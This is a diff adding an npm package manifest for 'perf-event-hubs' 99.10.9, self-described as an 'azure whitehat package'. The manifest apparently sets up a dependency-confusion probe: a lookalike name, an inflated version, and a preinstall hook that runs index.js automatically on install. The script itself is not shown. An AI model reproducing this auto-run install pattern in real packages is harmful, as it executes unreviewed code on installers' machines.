@@ -1,0 +1,39 @@
+{
+    "name": "perf-event-hubs",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-event-hubs@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-unyKPHPviwIe0dS0hdqbPIWMhcJD6mdrFPwOnwyzw98DokQBP2G4W5BfDBVU9hAAul+RPV5J/txVgsm3hc+/Wg==",
+        "shasum": "674453af72e943e3933b178169765daf66627e0a",
+        "tarball": "https://registry.npmjs.org/perf-event-hubs/-/perf-event-hubs-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3579,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon6dCRA9TVsSAnZWagAAlXkP/1BkQIiA90ND4ImeV/mJ\n76lmrLGotw99kJaFTWeBs3pBBMQzkWnkuRgZHAx4TaEm8a1tpzWhLmY72YXG\nV6JIoTAgZ8fRO7HHQ8N4Yj2XD+A3NawFixztX9uPhkqJr6BMwOPaxoLCPrgZ\nqwmxO2huaEXR9WJ8j0+EtdzYJWbPqjrP8fnG5QLFUwNqu6VPK/LY536O98X6\n+DKVBGghbsSEnoytVfTVqlaSmGj4si1U7+VGcISpTpl1PEmgSPhVMoazAsPT\nz6rNEg0no65torwKgGpuRwaJwlP/hnYq8YbSntlmkX/NsSY6jx0LwkqC6+w5\nSzxwcmJ0Fq6i2dudpcB9nwXqD8BlKjYvoe7Pwvu/c3vmsO7Rc/gaxjI3alh/\nICps6EqP0V67xYMAV3YD9+M9FXX90otMGJn2qUqsyVM/QV5YJYFxcvQyzWlX\nYa/V1cseo/nSN/4nxIW11iNtduX1eZapYtLnXTUQMDyxKAE/s18HpDDFr/jU\nGN2GhGCDk3FCfrOEtkncFGjNy4ffA4B6RSjrvIKtRXoweNCjuGPHRg2oGYIS\nl3QcfQgZ4kNrpsKLf36TxmvLckdp2EPUXY1WonX/Y3l6wIpxYg02cp8lwYoD\nd0jTpof3N6qWWeRJQqgwB6IdqzlV74xZ+Ys50DknoJy5yoEAwAi4TtEZM1H7\nJU3d\r\n=pEjL\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-event-hubs_99.10.9_1638039197701_0.7009671261984038"
+    },
+    "_hasShrinkwrap": false
+}
